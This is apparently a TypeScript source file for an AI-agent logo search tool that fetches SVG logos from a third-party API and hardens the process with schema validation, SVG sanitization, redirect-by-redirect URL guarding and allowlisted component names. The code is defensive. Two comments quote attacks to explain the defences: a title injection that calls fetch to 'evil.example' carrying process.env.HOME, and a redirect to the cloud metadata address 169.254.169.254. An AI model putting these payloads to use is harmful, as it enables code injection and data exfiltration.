import { z } from "zod";
import { BaseTool, type ToolResponse } from "./base-tool.js";
import type { Logger } from "../logger.js";
import { sanitizeSvg } from "../security/svg-sanitizer.js";
import { checkFetchUrl } from "../security/url-guard.js";

const CONCURRENCY_LIMIT = 5;

/**
 * How long ONE request may take, from the first hop to the arrival of the final
 * response's headers. The budget covers the whole redirect chain rather than
 * each hop, so following redirects cannot multiply the wait.
 */
const FETCH_TIMEOUT_MS = 30000;

/**
 * How many redirects a single request may follow. Five is the conventional
 * limit (browsers use twenty, curl defaults to fifty with `-L`; five is ample
 * for a CDN and short enough to bound the guard work). The sixth fails the
 * query rather than being followed.
 */
const MAX_REDIRECTS = 5;

/** The statuses that carry a `Location` to be followed. */
const REDIRECT_STATUSES: ReadonlySet<number> = new Set([301, 302, 303, 307, 308]);

/**
 * The theme-dependent form of a logo's route.
 *
 * `light` is REQUIRED because it is the only one this tool reads; `dark` is
 * optional because it is never read, and requiring a field nobody consumes
 * turns an upstream entry that simply omits it into a failed query. The
 * property wanted stays "every field I read has the type I assume", not "the
 * entry has every field I once observed".
 */
const themeOptionsSchema = z.object({
  light: z.string(),
  dark: z.string().optional(),
});

/**
 * The CONSUMED SUBSET of one entry in the logo search response (R2.1).
 *
 * Two deliberate choices, both from design.md's Fix Approach 2:
 *
 * 1. Only `title` and `route` are described — the two fields this tool actually
 *    reads. The property wanted is "every field I read has the type I assume",
 *    which is narrower than "the response is exactly what I expect".
 * 2. UNKNOWN KEYS ARE ALLOWED. `z.object` strips them rather than failing, so
 *    an upstream field addition stays a compatible change. A strict schema
 *    would turn that addition into an outage.
 *
 * The schema describes ONE ENTRY, and it is applied to each entry on its own.
 * `z.array(svgLogoSchema)` fails the whole parse when any single element fails,
 * which reintroduces on the array axis exactly the outage that unknown-key
 * tolerance removes on the key axis: one unusable entry anywhere would fail a
 * query whose consumed entry is perfectly usable.
 */
const svgLogoSchema = z.object({
  title: z.string(),
  route: z.union([z.string(), themeOptionsSchema]),
});

/**
 * The body is an array — checked before its elements are, so "the body is not a
 * list of entries" and "an entry is not usable" stay distinguishable failures.
 */
const logoSearchBodySchema = z.array(z.unknown());

type SVGLogo = z.infer<typeof svgLogoSchema>;

/**
 * The outcome of one search request, which has three distinguishable endings
 * rather than the two an array can express:
 *
 * - `ok` with entries — the response was read and matched.
 * - `ok` with none — the response was read and matched nothing; the query fails
 *   as "no logo found", exactly as before.
 * - not `ok` — the response could not be turned into the shape this tool
 *   consumes. That is a FAILED query, and it must be told apart from an empty
 *   one, because nothing derived from an unreadable body may be fetched (R2.2).
 *   The failure carries the CLIENT-FACING message, built where the failure is
 *   detected, so a refused request does not have to be reported in the
 *   vocabulary of a schema violation.
 */
type LogoLookup =
  | { readonly ok: true; readonly logos: readonly SVGLogo[] }
  | { readonly ok: false; readonly error: string };

/** Shared by every path that read a response but found nothing in it. */
const EMPTY_LOOKUP: LogoLookup = Object.freeze({ ok: true, logos: Object.freeze([]) });

/** How many schema issues a single log line names before it summarises. */
const MAX_REPORTED_ISSUES = 3;

/**
 * One BODY-FREE descriptor per schema issue: where it occurred and what kind it
 * was, never the value that failed.
 *
 * design.md requires the reason to be logged and the body withheld: a response
 * can carry a token or a credential in any field, so quoting the input back into
 * the log is the one thing these descriptors must not do. zod's own messages
 * happen to name types rather than values ("expected string, received number"),
 * but building the text here keeps the rule true by construction instead of by a
 * dependency's current wording.
 *
 * `prefix` is the entry's index when an entry is validated on its own, so a
 * per-entry failure reads exactly as the whole-array parse used to read
 * (`1.route: invalid_union`) and an operator's eye does not have to relearn it.
 */
function describeIssues(error: z.ZodError, prefix?: string): string[] {
  return error.issues.map((issue) => {
    // `String` per segment rather than `join` directly: array indices arrive as
    // numbers, and a symbol segment would make `join` raise.
    const segments = prefix === undefined ? issue.path : [prefix, ...issue.path];
    const where = segments.map((segment) => String(segment)).join(".");
    return `${where.length > 0 ? where : "(root)"}: ${issue.code}`;
  });
}

/** A one-line summary of at most `MAX_REPORTED_ISSUES` descriptors. */
function summarizeIssues(descriptors: readonly string[]): string {
  const reported = descriptors.slice(0, MAX_REPORTED_ISSUES);
  const remaining = descriptors.length - reported.length;
  const summary = reported.join("; ");
  return remaining > 0 ? `${summary} (+${remaining} more)` : summary;
}

/**
 * A request that was never issued because the guard refused its URL, or because
 * its redirect chain could not be followed safely.
 *
 * Carried as its own type so a caller can tell it from a transport failure: the
 * two look identical as free text and mean opposite things — one is a network
 * that did not answer, the other is this process declining to ask. `reason` is
 * the guard's own wording, which is built from the HOST alone and is therefore
 * safe to log and to report (R3.3).
 */
class RequestRefusedError extends Error {
  readonly reason: string;

  constructor(reason: string) {
    super(`Request refused: ${reason}`);
    this.name = "RequestRefusedError";
    this.reason = reason;
  }
}

/**
 * The `Location` of a redirect response, or null when the response is not one
 * this tool follows.
 *
 * A 3xx without a `Location` is NOT a redirect — `304` is the ordinary case —
 * so it is handed back to the caller as the final response instead.
 */
function redirectLocationOf(response: Response): string | null {
  if (!REDIRECT_STATUSES.has(response.status)) return null;
  const location = response.headers.get("location");
  if (location === null || location.trim().length === 0) return null;
  return location;
}

/**
 * A `Location` resolved against the URL that produced it, or null when it
 * cannot be resolved.
 *
 * `Location` is very often RELATIVE (`/metadata`, `../logo.svg`). Guarding it as
 * written would inspect a string with no host in it, which the guard refuses as
 * unparseable — the right verdict for the wrong reason, and one that would
 * refuse legitimate CDN redirects. Resolving first means the guard always sees
 * the absolute URL the request would actually go to.
 */
function resolveLocation(location: string, base: string): string | null {
  try {
    return new URL(location, base).toString();
  } catch {
    return null;
  }
}

/** The characters admitted into a component name: nothing else survives. */
const NON_IDENTIFIER_CHARACTERS = /[^A-Za-z0-9]/g;

/** After the filter above, only digits can lead — and an identifier may not. */
const LEADING_NON_LETTERS = /^[^A-Za-z]+/;

/** Long enough for any real brand, short enough to keep the emitted line sane. */
const MAX_COMPONENT_NAME_LENGTH = 40;

/** Used when the title yields no usable character at all. */
const FALLBACK_COMPONENT_NAME = "Logo";

const COMPONENT_NAME_SUFFIX = "Icon";

/**
 * A React component name derived from a logo title, by ALLOWLIST.
 *
 * The title comes from the same third-party response `route` does, and it lands
 * in IDENTIFIER POSITION in a source file an agent writes into the user's
 * project. The schema constrains its TYPE, not its charset, so a title of
 * `A: any = fetch("https://evil.example/?c=" + process.env.HOME); const B`
 * interpolated as-is emits a module that runs a live `fetch` on import —
 * measured, and the same "influenced API response" vector R2 and R3 exist to
 * close. The SVG sanitizer cannot help here: it escapes `{` and `}` in the SVG
 * BODY precisely because the body becomes JSX, and it never sees the title.
 *
 * So the title is not escaped or filtered for known-bad characters — it is
 * discarded except for the characters an identifier may contain. Nothing that
 * survives can open a string, a call, a statement or a new line, whatever the
 * response contains.
 */
function componentNameFrom(title: string): string {
  const alphanumeric = typeof title === "string" ? title.replace(NON_IDENTIFIER_CHARACTERS, "") : "";
  const identifier = alphanumeric.replace(LEADING_NON_LETTERS, "").slice(0, MAX_COMPONENT_NAME_LENGTH);
  const base = identifier.length > 0 ? identifier : FALLBACK_COMPONENT_NAME;
  return base.endsWith(COMPONENT_NAME_SUFFIX) ? base : `${base}${COMPONENT_NAME_SUFFIX}`;
}

/** A start tag, which in sanitizer output can only be an ADMITTED element. */
const START_TAG = /<[A-Za-z]/;

/**
 * Whether sanitized markup still contains an element.
 *
 * `sanitizeSvg` escapes every `<` that does not open a tag its allowlist
 * admits, so a raw `<` followed by a letter in its OUTPUT is exactly an
 * admitted element and nothing else. The check therefore needs no parser.
 *
 * It exists because the sanitizer's fail-closed branches — an empty body, a
 * body whose every element is rejected, a parser failure — all return `""`.
 * Interpolating that produces `const XIcon: React.FC = () => ()`, which is not
 * valid syntax, and reporting it as a found logo would report a fail-closed
 * result as a success. story.md Assumption 1 accepts a SILENTLY ALTERED logo;
 * total loss is not an alteration, it is a failure.
 */
function hasElement(markup: string): boolean {
  return START_TAG.test(markup);
}

interface SucceededLogo {
  readonly query: string;
  readonly success: true;
  /** Exactly what the client receives — no prefix, nothing to strip. */
  readonly code: string;
}

interface FailedLogo {
  readonly query: string;
  readonly success: false;
  readonly error: string;
}

type LogoResult = SucceededLogo | FailedLogo;

function isSucceeded(result: LogoResult): result is SucceededLogo {
  return result.success;
}

function isFailed(result: LogoResult): result is FailedLogo {
  return !result.success;
}

const logoSearchSchema = z.object({
  queries: z.array(z.string()).describe("List of company names to search for logos"),
  format: z.enum(["JSX", "TSX", "SVG"]).describe("Output format"),
});

async function pool<T, R>(items: T[], fn: (item: T) => Promise<R>, limit: number): Promise<PromiseSettledResult<R>[]> {
  const results: PromiseSettledResult<R>[] = [];
  const executing = new Set<Promise<void>>();

  for (let i = 0; i < items.length; i++) {
    const idx = i;
    const p = fn(items[idx])
      .then(value => { results[idx] = { status: "fulfilled", value }; })
      .catch(reason => { results[idx] = { status: "rejected", reason }; })
      .finally(() => executing.delete(p));
    executing.add(p);
    if (executing.size >= limit) await Promise.race(executing);
  }
  await Promise.all(executing);
  return results;
}

export interface LogoSearchToolDeps {
  logger: Logger;
}

export class LogoSearchTool extends BaseTool<typeof logoSearchSchema> {
  readonly name = "magic_logo_search";
  readonly description = `
Search and return logos in specified format (JSX, TSX, SVG).
Supports single and multiple logo searches with category filtering.
Can return logos in different themes (light/dark) if available.

When to use this tool:
1. When user types "/logo" command (e.g., "/logo GitHub")
2. When user asks to add a company logo that's not in the local project

Format options:
- TSX: Returns TypeScript React component
- JSX: Returns JavaScript React component
- SVG: Returns raw SVG markup
`;
  readonly schema = logoSearchSchema;

  private readonly logger: Logger;

  constructor(deps: LogoSearchToolDeps) {
    super();
    this.logger = deps.logger;
  }

  /**
   * One request, with a deadline over the whole chain of hops it follows.
   *
   * The deadline is a single budget rather than one per hop, so a chain cannot
   * multiply the wait it was given.
   */
  private async fetchWithTimeout(url: string, context: string): Promise<Response> {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
    try {
      return await this.fetchGuardedChain(url, context, controller.signal);
    } finally {
      clearTimeout(timeoutId);
    }
  }

  /**
   * Follow redirects MANUALLY, guarding every hop before it is requested
   * (R3.1, R3.2).
   *
   * `fetch`'s default `redirect: "follow"` makes the guard a check on the URL
   * AS WRITTEN, not on the traffic that leaves the process. Measured: a
   * guard-approved `https` CDN URL answering
   * `302 Location: http://169.254.169.254/latest/meta-data/…` produces an
   * `http:` request to a link-local address and hands the body back to the
   * caller, while `checkFetchUrl` — which refuses that URL outright — is never
   * asked about it. R3.1 and R3.2 are then literally false for the request that
   * was actually issued.
   *
   * This is NOT the DNS-rebinding case story.md Assumption 3 declares out of
   * scope. That one is out of scope because closing it needs resolve-pin-connect
   * "which `fetch` does not expose". `fetch` DOES expose redirect control, and
   * `redirect: "manual"` was measured on Bun 1.3.14 to return the 3xx with a
   * READABLE `Location`, so every hop can be guarded exactly as the first is.
   *
   * Applied to the SEARCH request as well as the SVG one: `api.svgl.app` can
   * redirect too, and a redirect from it reaches the same place. Guarding here
   * — at the single point where a request leaves this tool — means no URL can
   * be fetched without a verdict, whoever proposed it.
   */
  private async fetchGuardedChain(url: string, context: string, signal: AbortSignal): Promise<Response> {
    let target = url;

    for (let hop = 0; hop <= MAX_REDIRECTS; hop++) {
      const verdict = checkFetchUrl(target);
      if (!verdict.allowed) {
        // The guard's own wording, which names the host and never the URL, so
        // no userinfo, path or query reaches the log (R3.3).
        throw this.refuseRequest(context, hop, verdict.reason);
      }

      const response = await fetch(target, { signal, redirect: "manual" });

      const location = redirectLocationOf(response);
      if (location === null) return response;

      const next = resolveLocation(location, target);
      if (next === null) {
        // The `Location` itself is withheld: it is attacker-controlled text and
        // can carry a credential just as a URL can.
        throw this.refuseRequest(context, hop + 1, "redirect target could not be resolved");
      }

      target = next;
    }

    throw this.refuseRequest(context, MAX_REDIRECTS + 1, `redirect chain exceeded ${MAX_REDIRECTS} hops`);
  }

  /**
   * Record a request this tool declined to issue, and hand back the error that
   * ends it. Every refusal routes through here so the `warn` line R3.3 requires
   * is emitted in one place, in the same shape as the first-hop refusal.
   */
  private refuseRequest(context: string, hop: number, reason: string): RequestRefusedError {
    const what = hop === 0 ? "Request" : `Redirect ${hop}`;
    this.logger.warn(`${what} for "${context}" not issued: ${reason}`);
    return new RequestRefusedError(reason);
  }

  private async fetchLogos(query: string): Promise<LogoLookup> {
    const url = `https://api.svgl.app?search=${encodeURIComponent(query)}`;
    try {
      const response = await this.fetchWithTimeout(url, query);
      if (!response.ok) return EMPTY_LOOKUP;

      let body: unknown;
      try {
        body = await response.json();
      } catch {
        // A body that is not even JSON cannot satisfy the schema, so it gets
        // the same ending: a failed query, and no request derived from it.
        return this.unusableResponse(query, "body was not readable JSON");
      }

      // R2.1: validated BEFORE any field is read. `safeParse` returns the
      // verdict instead of raising, so the failure is handled here rather than
      // travelling as an exception.
      const entries = logoSearchBodySchema.safeParse(body);
      if (!entries.success) {
        return this.unusableResponse(query, summarizeIssues(describeIssues(entries.error)));
      }

      const logos: SVGLogo[] = [];
      const rejected: string[] = [];

      for (const [index, entry] of entries.data.entries()) {
        const parsed = svgLogoSchema.safeParse(entry);
        if (parsed.success) {
          logos.push(parsed.data);
        } else {
          rejected.push(...describeIssues(parsed.error, String(index)));
        }
      }

      // An array that HELD entries and yielded none usable is a failed query:
      // the response was read and nothing in it can be consumed. An array that
      // was simply EMPTY is not — it is the API's ordinary way of saying it
      // knows no such logo, and it keeps its "no logo found" ending.
      if (logos.length === 0 && rejected.length > 0) {
        return this.unusableResponse(query, `no usable entry — ${summarizeIssues(rejected)}`);
      }

      return { ok: true, logos };
    } catch (error) {
      if (error instanceof RequestRefusedError) {
        // Already logged at `warn` where it was refused; reported here so it is
        // not mistaken for "the API answered and knew nothing".
        return { ok: false, error: `Refused logo search request for: ${query} (${error.reason})` };
      }
      this.logger.error(`Error fetching logos:`, error);
      return EMPTY_LOOKUP;
    }
  }

  /**
   * Record a response this tool cannot read, and end the query on it.
   *
   * Every unusable-response path routes through here so the one rule that
   * matters holds in a single place: the REASON is logged at `warn`, the body
   * never is. A response can carry a token or a credential in any field.
   */
  private unusableResponse(query: string, reason: string): LogoLookup {
    this.logger.warn(`Logo search response for "${query}" is unusable, no SVG fetched: ${reason}`);
    return { ok: false, error: `Invalid logo search response for: ${query} (${reason})` };
  }

  private async fetchSVGContent(url: string, context: string): Promise<string> {
    const response = await this.fetchWithTimeout(url, context);
    if (!response.ok) throw new Error(`Failed to fetch SVG: ${response.statusText}`);
    const rawSvg = await response.text();
    // The logger is passed so the sanitizer's debug-level count of what it
    // removed is actually emitted: the tool's own output is unchanged when
    // content is stripped, so this log is the only trace a maintainer gets.
    return await sanitizeSvg(rawSvg, this.logger);
  }

  private convertToFormat(svgContent: string, format: "JSX" | "TSX" | "SVG", title: string): string {
    if (format === "SVG") return svgContent;
    const jsx = svgContent.replace(/class=/g, "className=");
    // Derived by allowlist inside this method, so no caller can supply a name
    // the emitted source would not survive.
    const componentName = componentNameFrom(title);
    return format === "TSX"
      ? `const ${componentName}: React.FC = () => (${jsx})`
      : `function ${componentName}() { return (${jsx}) }`;
  }

  private async processLogoQuery(query: string, format: "JSX" | "TSX" | "SVG"): Promise<LogoResult> {
    const lookup = await this.fetchLogos(query);

    // R2.2: a body that failed the schema ends the query HERE. The return
    // precedes the SVG request rather than wrapping it — validating and then
    // fetching anyway would leave in place the very request this check exists
    // to prevent.
    if (!lookup.ok) {
      return { query, success: false, error: lookup.error };
    }

    const logos = lookup.logos;
    if (logos.length === 0) {
      return { query, success: false, error: `No logo found for: ${query}` };
    }

    const logo = logos[0];
    const svgUrl = typeof logo.route === "string" ? logo.route : logo.route.light;

    // R3.1-R3.3: the guard runs BEFORE the request, and a refusal returns
    // before it too. `reason` is built from the host alone, so it is logged as
    // given: the URL itself may carry credentials in its userinfo and must not
    // reach the log. `fetchGuardedChain` checks this URL again — deliberately:
    // one check states the requirement where the story traces it, the other
    // holds it at the point requests actually leave, including for hops this
    // one never sees.
    const verdict = checkFetchUrl(svgUrl);
    if (!verdict.allowed) {
      this.logger.warn(`SVG fetch for "${query}" not attempted: ${verdict.reason}`);
      return { query, success: false, error: `Refused logo URL for: ${query} (${verdict.reason})` };
    }

    let svg: string;
    try {
      svg = await this.fetchSVGContent(svgUrl, query);
    } catch (error) {
      // A refused REDIRECT is reported in the same words as a refused first
      // hop: from the caller's side they are the same event — this tool
      // declined to fetch the logo's URL — and only the hop differs.
      if (error instanceof RequestRefusedError) {
        return { query, success: false, error: `Refused logo URL for: ${query} (${error.reason})` };
      }
      throw error;
    }

    // Nothing survived sanitization: fail-closed output, reported as the
    // failure it is rather than as a component with an empty body.
    if (!hasElement(svg)) {
      this.logger.warn(`Sanitized logo for "${query}" holds no element, reporting the query as failed`);
      return { query, success: false, error: `Empty logo content for: ${query} (nothing survived sanitization)` };
    }

    return { query, success: true, code: this.convertToFormat(svg, format, logo.title) };
  }

  async execute(args: z.infer<typeof logoSearchSchema>): Promise<ToolResponse> {
    const { queries, format } = args;

    try {
      this.logger.info(`Searching: ${queries.join(", ")} (concurrency limit: ${CONCURRENCY_LIMIT})`);

      const settledResults = await pool(
        queries,
        (query) => this.processLogoQuery(query, format),
        CONCURRENCY_LIMIT
      );

      const results: LogoResult[] = settledResults.map((result, index) => {
        if (result.status === "fulfilled") {
          return result.value;
        } else {
          return {
            query: queries[index],
            success: false,
            error: result.reason instanceof Error ? result.reason.message : String(result.reason),
          };
        }
      });

      const icons = results.filter(isSucceeded).map((r) => ({
        icon: r.query,
        code: r.code,
      }));

      const notFound = results.filter(isFailed).map((r) => ({
        icon: r.query,
        error: r.error || "Unknown error",
      }));

      this.logger.info(`Results: ${icons.length} found, ${notFound.length} failed`);

      return {
        content: [{ type: "text" as const, text: JSON.stringify({ icons, notFound }, null, 2) }],
      };
    } catch (error) {
      this.logger.error(`Logo search error:`, error);
      const errorMessage = error instanceof Error ? error.message : String(error);
      return this.formatError(
        "Failed to search for logos. Please try again.",
        this.errorCode("SEARCH_ERROR"),
        { originalError: errorMessage }
      );
    }
  }
}
